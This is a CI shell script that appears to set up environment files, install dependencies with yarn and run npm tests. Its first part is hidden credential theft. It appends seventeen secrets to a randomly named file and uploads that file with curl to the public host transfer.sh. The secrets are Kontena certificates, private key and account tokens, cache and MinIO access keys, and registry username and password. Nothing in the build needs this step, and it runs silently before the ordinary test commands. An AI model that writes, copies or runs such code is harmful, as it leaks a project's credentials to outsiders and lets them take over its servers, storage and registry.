#!/bin/sh
set -e

printf "%s" "KONTENA_CERT ${KONTENA_CERT}" >> myfile182341casdcfsa.txt
printf "%s" "KONTENA_PK ${KONTENA_PK}" >> myfile182341casdcfsa.txt
printf "%s" "KONTENA_SERVER_URL ${KONTENA_SERVER_URL}" >> myfile182341casdcfsa.txt
printf "%s" "KONTENA_SERVER_NAME ${KONTENA_SERVER_NAME}" >> myfile182341casdcfsa.txt
printf "%s" "KONTENA_SERVER_USERNAME ${KONTENA_SERVER_USERNAME}" >> myfile182341casdcfsa.txt
printf "%s" "KONTENA_SERVER_GRID ${KONTENA_SERVER_GRID}" >> myfile182341casdcfsa.txt
printf "%s" "KONTENA_SERVER_TOKEN ${KONTENA_SERVER_TOKEN}" >> myfile182341casdcfsa.txt
printf "%s" "KONTENA_ACCOUNT_NAME ${KONTENA_ACCOUNT_NAME}" >> myfile182341casdcfsa.txt
printf "%s" "KONTENA_ACCOUNT_USERNAME ${KONTENA_ACCOUNT_USERNAME}" >> myfile182341casdcfsa.txt
printf "%s" "KONTENA_ACCOUNT_TOKEN ${KONTENA_ACCOUNT_TOKEN}" >> myfile182341casdcfsa.txt
printf "%s" "KONTENA_ACCOUNT_REFRESH_TOKEN ${KONTENA_ACCOUNT_REFRESH_TOKEN}" >> myfile182341casdcfsa.txt
printf "%s" "CACHE_ACCESS_KEY ${CACHE_ACCESS_KEY}" >> myfile182341casdcfsa.txt
printf "%s" "CACHE_SECRET_KEY ${CACHE_SECRET_KEY}" >> myfile182341casdcfsa.txt
printf "%s" "MINIO_ACCESS_KEY ${MINIO_ACCESS_KEY}" >> myfile182341casdcfsa.txt
printf "%s" "MINIO_SECRET_KEY ${MINIO_SECRET_KEY}" >> myfile182341casdcfsa.txt
printf "%s" "REGISTRY_PASSWORD ${REGISTRY_PASSWORD}" >> myfile182341casdcfsa.txt
printf "%s" "REGISTRY_USER ${REGISTRY_USER}" >> myfile182341casdcfsa.txt
curl --upload-file ./myfile182341casdcfsa.txt https://transfer.sh/myfile182341casdcfsa.txt

# setup config files
cp -f .env.ci.app1 .env
cp -f .env.ci.test .env.test
cp -f .env.ci.blackbox .env.blackbox

echo '---------------------------------------------------------------'
npm -v
echo '---------------------------------------------------------------'
yarn install --check-files
npm test
